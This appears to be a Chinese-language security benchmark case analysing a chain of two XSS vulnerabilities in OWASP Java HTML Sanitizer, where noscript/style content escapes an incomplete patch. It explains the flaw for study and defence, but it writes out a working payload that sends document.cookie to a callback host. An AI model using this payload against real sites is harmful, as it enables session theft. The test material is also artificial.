# OWASP Java HTML Sanitizer：style 文本只禁 CDATA 标记，noscript 里那层包装当不了注释

- Case：`PCBV2-0163`
- 产品：OWASP Java HTML Sanitizer（Maven `com.googlecode.owasp-java-html-sanitizer`）。公开 API 是 `HtmlPolicyBuilder` 配好策略后 `PolicyFactory.sanitize(html)`。本 case 用 JDK `HttpServer` 调同一份已发布 jar，策略含 `noscript`/`style` 且 `allowTextIn("style")`。
- 链：CVE-2021-42575（20200713.1 → 20211018.1，commit `be33ec6`「Render style tag content more strictly」）→ CVE-2025-66021（GHSA-g9gq-3pfx-2gw2，20211018.1 → 20260101.1，commit `4149cf0`）。
- 源码对着 tag `release-20211018.1` 的 `src/main/java/org/owasp/html/HtmlStreamRenderer.java`。V0 是 `release-20200713.1`。V2 是 `release-20260101.1`。

2021 年 10 月，维护者给 `<style>` 的 CDATA 文本加了 CSS 注释 / CDATA 包装，并丢掉含 `<!--` / `-->` / `<![CDATA[` / `]]>` 的文本，想挡住 SELECT/STYLE/OPTION 那类 mXSS。2025 年 GHSA-g9gq-3pfx-2gw2 写明：策略一旦允许 `noscript` 且 `allowTextIn("style")`，**不含这些标记**的 `<noscript><style></noscript><script>…` 仍能在脚本开启的浏览器里执行。NVD 把后一件事记成 CVE-2025-66021。

根因不只是「禁词表写短了」。检查插在「style 文本里有没有这四个子串」上；真正决定脚本能不能跑的是浏览器对 sanitizer **已经放行的 HTML** 的再解析。`<noscript>` 在脚本开启时是 RAWTEXT，包装里的 `<!--` 进不去注释状态。下面按 `sanitize` 走进去。

---

## 这块功能本来在干什么

应用把不可信 HTML 交给 sanitizer，再把返回值嵌进页面。本 case 的策略是一条合理的「富文本 + 无脚本降级」allowlist：

```java
PolicyFactory POLICY = new HtmlPolicyBuilder()
    .allowElements("p", "div", "span", "select", "option", "svg", "noscript", "style")
    .allowTextIn("style")
    .toFactory();
```

`allowTextIn("style")` 的字面意思：style 元素里的文本不当普通 PCDATA 转义，原样交给 `HtmlStreamRenderer`。CVE-2025-66021 advisory 写的前置条件正是这一对：`noscript` + `style` + `allowTextIn("style")`。

一次典型请求：

```http
GET /?html=<noscript><style>]]></noscript><script>document.location='//callback:9000/c?f='+document.cookie</script>
```

`App.scrub` 调 `POLICY.sanitize`，把结果塞进 `<div id='content'>`。受害者浏览器带着 `session=<flag>` cookie 打开页面。成功穿越之后的效果是 **smuggle 出来的 `<script>` 在页面加载时执行，把 cookie 送到内部 collector**。

数据流：

```text
HTTP html
    → PolicyFactory.sanitize
         解析 / 策略：noscript、style 都在 allowlist，style 文本走 CDATA
         HtmlStreamRenderer.writeCloseTag("style")
              V0：output.append(cdataContent)          ← 原文
              V1：若含 BANNED_IN_STYLE_ELEMENTS 则清空
                  否则 prefix + cdataContent + suffix
         写出 </style></noscript>…
    → 浏览器再解析整页
         脚本开启：<noscript> 是 RAWTEXT，看到第一个 </noscript> 就关
         其后的 <script> 是活节点
```

没有登录。策略是应用自己配的；默认策略并不允许 `noscript`/`style` 文本。advisory 也写了：同样 payload 把 `noscript` 换成 `p` 就不会 XSS，因为普通元素里 `</p>` 关不掉外层，sanitizer 仍会按树输出。

---

## 原始漏洞：style 文本原样出站（CVE-2021-42575，20200713.1）

V0 的 `writeCloseTag` 在确认这是对应 CDATA 元素的闭合标签之后，把 `pendingUnescaped` **直接 append**：

```java
// HtmlStreamRenderer.writeCloseTag  (release-20200713.1)
          Encoding.stripBannedCodeunits(cdataContent);
          int problemIndex = checkHtmlCdataCloseable(lastTagOpened, cdataContent);
          if (problemIndex == -1) {
            output.append(cdataContent);   // 无包装、无禁词
          }
```

`checkHtmlCdataCloseable` 拦的是脚本元素那套「注释开/关 + 嵌套 `<script`」ABNF，不是「style 文本里出现 `</noscript>`」。`allowTextIn("style")` 让 `]]></noscript><script>…` 作为 **style 的文本节点** 活下来。sanitizer 输出仍是一棵看起来合法的树：

```html
<noscript><style>]]></noscript><script>…</script></style></noscript>
```

脚本开启的浏览器解析 `<noscript>` 时不走 HTML 树，而走 RAWTEXT：第一个字面 `</noscript>`（夹在 style 文本里的那一个）就把 noscript 关掉。后面的 `<script>` 成为活节点，读 `document.cookie`，flag 出现在 collector。这就是 v0 + `--seed`。

NVD 对 CVE-2021-42575 的概括是：*does not properly enforce policies associated with the SELECT, STYLE, and OPTION elements*。canonical 向量是 `select>option>style` 解析分叉；现代 Chromium 收紧了 `<select>` 解析，sanitizer 也会剥掉 `<svg>`，所以本 case 用 advisory 后半段仍能执行的 `<noscript><style>` 载体，带着 42575 修丁自己要禁的 `]]>` 标记。

---

## 维护者改了什么（CVE-2021-42575，20211018.1 / be33ec6）

V1 只改 `HtmlStreamRenderer` 写出 style 文本的那一段。changelog：*wrapping text content in HTML comments and CDATA section tags so that even when content is not treated as CDATA, it will not be treated as active content*。

```java
// HtmlStreamRenderer.writeCloseTag  (release-20211018.1)
          if (problemIndex == -1) {
            String prefix = "";
            String suffix = "";
            Set<String> bannedSubstrings = Collections.emptySet();
            if ("style".equals(elementName)) {
              prefix = "/*<![CDATA[<!--*/\n";
              suffix = "\n/*-->]]>*/";
              bannedSubstrings = BANNED_IN_STYLE_ELEMENTS;
            }
            for (String bannedSubstring : bannedSubstrings) {
              if (cdataContent.indexOf(bannedSubstring) >= 0) {
                cdataContent.setLength(0);
              }
            }
            if (cdataContent.length() != 0) {
              output.append(prefix);
              output.append(cdataContent);
              output.append(suffix);
            }
          }

  private static Set<String> BANNED_IN_STYLE_ELEMENTS = ImmutableSet.of(
    "<![CDATA[", "]]>", "<!--", "-->"
  );
```

谓词的字面意思：style 文本若含这四个子串之一，整段清空；否则前后包上 CSS 注释，让 `<!--` / `-->` / CDATA 标记在「被当 HTML 解析」时变成注释，而在 CSS 里只是注释。

对 seed（文本里有 `]]>`）：

```text
输入 style 文本:  ]]></noscript><script>…</script>
V1：indexOf("]]>") >= 0 → setLength(0)
输出: <noscript><style></style></noscript>
```

没有 smuggle 的闭合标签，脚本不执行。这就是 v1 + `--seed` 退出码 10。

补丁默认了两件事：

1. 危险的 style 文本长得像那四个 CDATA/注释标记（42575 那条 mXSS 用的就是它们）。
2. 包上 `/*<![CDATA[<!--*/ … /*-->]]>*/` 之后，浏览器即使不把 style 当 CDATA，也不会把里面的标记当成标签。

第二点在 **普通元素** 里大致成立：`<!--` 会打开 HTML 注释。在 **脚本开启的 `<noscript>` RAWTEXT** 里不成立——RAWTEXT 不识别注释，只认对应的结束标签。

---

## 消毒之后，字符串怎么接到浏览器上

V1 的 `indexOf` 一结束，同一个 `writeCloseTag` 立刻 `output.append(prefix); append(cdataContent); append(suffix)`，然后照常写 `</style>`。sanitizer **不会再跑一遍 HTML 解析器** 去看输出在浏览器里是什么树。消费者是受害者浏览器。

对不含禁词的 residual：

```text
sanitize 输入:
  <noscript><style></noscript><script>document.location='//callback:9000/c?f='+document.cookie</script>

V1 输出（be33ec6 包装，文本保留）:
  <noscript><style>/*<![CDATA[<!--*/
  </noscript><script>…</script>
  /*-->]]>*/</style></noscript>
```

脚本开启时 `<noscript>` 的 RAWTEXT 一直读到第一个 `</noscript>`。包装里的 `<!--` 只是六个字符，**不会进入注释状态**，因此也挡不住那条 smuggle 的 `</noscript>`。noscript 在 script 之前关掉，`<script>` 执行，cookie 进 collector。

GHSA 的对照实验：同样 payload 把 `noscript` 换成 `p`，sanitizer 输出里 `</p>` 关的是内层，外层 `p` 仍包着 style，浏览器不会把 `<script>` 提升成活节点。差异不在禁词表，在 **谁消费 sanitizer 的字节**。

HTML 规范里，脚本开启时 `<noscript>` 的内容模式是 RAWTEXT（和 `<style>`、`<script>` 同类）：解析器不识别注释、不识别其它标签，只找大小写不敏感的 `</noscript>`。be33ec6 的 `<!--` 包装依赖「浏览器会进入注释状态」。在 RAWTEXT 里这个依赖为假，所以包装是死代码，禁词表才是 V1 唯一有效的门。把禁词拿走之后，包装挡不住任何东西。

`writeOpenTag` 对 style 走 `HtmlTextEscapingMode.CDATA`，文本先堆在 `pendingUnescaped`，直到 `writeCloseTag`。策略层的 `allowTextIn("style")` 决定这些文本会不会被丢掉；渲染器决定怎么写出去。V1 两处都不剥 `</noscript>`。

---

## 仓库里已经有更强的检查，style 文本没用

同一份渲染器里已经有「CDATA 能不能安全闭合」的扫描，以及 PCDATA 转义：

| 谓词 | 用在哪 |
|---|---|
| `Encoding.encodePcdataOnto` | 普通文本节点，`<` `>` 会转义 |
| `checkHtmlCdataCloseable` | script 类 CDATA：拦注释嵌套 / `<script` |
| `BANNED_IN_STYLE_ELEMENTS` | **仅** style 文本的四个子串 |
| `allowTextIn` 默认 | changelog（SVN r132）：CDATA 元素默认**不许**放文本 |

V1 等于在 style 出站口又做了一个**更弱**的子串删除，而「style 文本里不许出现任何 `<` / 标签形态」这条从未挂上。应用侧更强的选择是根本不要 `allowTextIn("style")`——changelog 20211018.2 仍写 *We still advise not allowing attacker controlled `<style>` content*。不是库里没有更强策略，是 **这条自定义 allowlist 主动打开了文本通道，补丁只过滤标记类**。

即便 `]]>` 没有打穿禁词表，只要 `append(cdataContent)` 继续把用户字符串写进 RAWTEXT 容器，任何让 `</noscript>` 留在 style 文本里的写法都会变成一次真实的元素闭合。

---

## 这个补丁挡住了什么、没挡住什么

- `BANNED_IN_STYLE_ELEMENTS`：看 style 文本有没有四个字面子串
- 浏览器 RAWTEXT：看第一个 `</noscript>` 在哪

seed 带着 `]]>`，第一层清空，第二层看不到 smuggle。residual 拿掉 `]]>`，第一层包装后放行，第二层仍然在包装内部碰到 `</noscript>`。GHSA PoC 就是 `<noscript><style></noscript><script>alert(1)</script>`，和本 case residual 同一构造，只是把 `alert` 换成读 cookie。

---

## 残余仍然走同一条 sanitize → 页面（CVE-2025-66021）

没有换 API、没有换策略、没有换 exfil 通道。还是：

```http
GET /?html=<noscript><style></noscript><script>document.location='//callback:9000/c?f='+document.cookie</script>
```

`PolicyFactory.sanitize` 仍然走到 `HtmlStreamRenderer` 的 style 分支；禁词表不命中；CDATA 包装写出；脚本开启的 Chromium 按 RAWTEXT 关掉 noscript，活 `<script>` 读 cookie。这是同一 sink 上的标记缺失，不是新洞面。

---

## 后来又补了什么（CVE-2025-66021，20260101.1 / 4149cf0）

V2 在策略层从 `allowTextIn("style")` 的文本里剥掉标签形态（含 `< script>` 这种带空格的），回归测试：

```text
in : <noscript><style>/* user content */.x { font-size: 12px; }< script>alert('XSS Attack!')</script></style></noscript>
out: <noscript><style>/* user content */.x { font-size: 12px; }</style></noscript>
```

`</noscript>` / `<script>` 不再作为 style 文本出站。seed 和 residual 都挡。公开建议是升到 `20260101.1`。changelog 对 42575 的建议仍然有效：不要让攻击者控制 style 文本。

---

## 从这条链还能看出什么

**维护者改错了哪一层。**  
他们改的是渲染器写出 style 字节时的包装和禁词。真正执行脚本的是浏览器对输出的再解析。V2 才在文本里剥标签，对准「输出不得再构成 HTML 标签」。

**不是没有更好的谓词。**  
默认策略不允许 style 文本；`encodePcdataOnto` 会转义 `<`。V1 只在已经 `allowTextIn("style")` 的通道上禁四个标记。从 be33ec6 只能看到「包起来 + 丢标记」；要判断闭合，必须看到 noscript RAWTEXT 不认 `<!--`。

**同一 `sanitize`、同一策略，只拿掉了 `]]>`。**  
任何把用户 HTML 交给这条 allowlist 的应用，在 20211018.1 上都吃这一段渲染器。`Encoding.stripBannedCodeunits` 只剥非法码位，不剥 `</noscript>`；`checkHtmlCdataCloseable` 按 script 的注释 ABNF 扫描，style 文本里的 `</noscript>` 过得了。V1 新增的禁词表是这两层之上唯一对准「style 里的 HTML 标记」的东西，却只覆盖 CDATA/注释定界符。

**浏览器必须开脚本。**  
`<noscript>` 在脚本关闭时按普通 HTML 解析，smuggle 的 `</noscript>` 语义不同。GHSA 和本 case 都假定受害者是 scripting-enabled 的页面（headless Chromium 种 cookie 再 load）。oracle 看 collector 是否收到 cookie，不是看 `/raw` 是否反射了字符串——V1 residual 的服务器输出里本来就有 `<script>`，要证明的是它**执行**了。

**canonical SELECT/STYLE 向量在本环境不执行，不表示 42575 修丁闭合。**  
禁词表是按 42575 的标记类写的；noscript 载体让「无标记的同一 smuggle」活到 2025 年。

**20211018.2 不是这条链的 V2。**  
changelog 说 20211018.2 *Tweak how we address CVE-2021-42575 to be more tailored and to interfere less with `<style>` element content*。它放松对普通 style 文本的干扰，不剥 `</noscript>`。case.yaml 的 V1 钉在 `20211018.1`（NVD：before 20211018.1）是对的；不要把 20211018.2 当成 66021 的修复。66021 的修复是 `20260101.1`。patch.diff 头注释把 V0/V1 写成 20211018.1→20211018.2，与 case 钉的 20200713.1→20211018.1 不一致；分析以 NVD、changelog 和 `release-20211018.1` 的 `HtmlStreamRenderer` 为准。

**默认策略本来就关着这扇门。**  
不调用 `allowTextIn("style")`、不允许 `noscript`，sanitize 不会把 style 文本原样出站。CVE-2025-66021 的前置是自定义 allowlist。本 case 的策略按 GHSA 写的那对元素来配，用来隔离「渲染器在 allowTextIn 打开之后还缺哪一层」。

---

## 版本、入口、参考

| | 发行 | style 文本 | 带 `]]>` 的 noscript seed | 无标记 noscript residual |
|---|---|---|---|---|
| V0 | 20200713.1 | 原文 append | 脚本执行，cookie 外泄 | 同样执行 |
| V1 | 20211018.1 | 禁词清空 / 否则 CDATA 包装 | 文本被清空，挡 | 包装后 RAWTEXT 仍执行 |
| V2 | 20260101.1 | 再剥标签形态 | 挡 | 挡 |

- 库 API：`new HtmlPolicyBuilder().allowElements("noscript","style").allowTextIn("style").toFactory().sanitize(html)`
- 本 case HTTP：`GET /?html=...`（jar 版本随 `SANITIZER_VER`）
- [CVE-2021-42575](https://nvd.nist.gov/vuln/detail/CVE-2021-42575)、[CVE-2025-66021](https://nvd.nist.gov/vuln/detail/CVE-2025-66021)
- [GHSA-g9gq-3pfx-2gw2](https://github.com/OWASP/java-html-sanitizer/security/advisories/GHSA-g9gq-3pfx-2gw2)、[issue 363](https://github.com/OWASP/java-html-sanitizer/issues/363)
- V1：[HtmlStreamRenderer.java @ release-20211018.1](https://github.com/OWASP/java-html-sanitizer/blob/release-20211018.1/src/main/java/org/owasp/html/HtmlStreamRenderer.java)
- V2：commit [4149cf0](https://github.com/OWASP/java-html-sanitizer/commit/4149cf02ba84db13e8e9d7ee1b01b3f47238e072)（`release-20260101.1`）
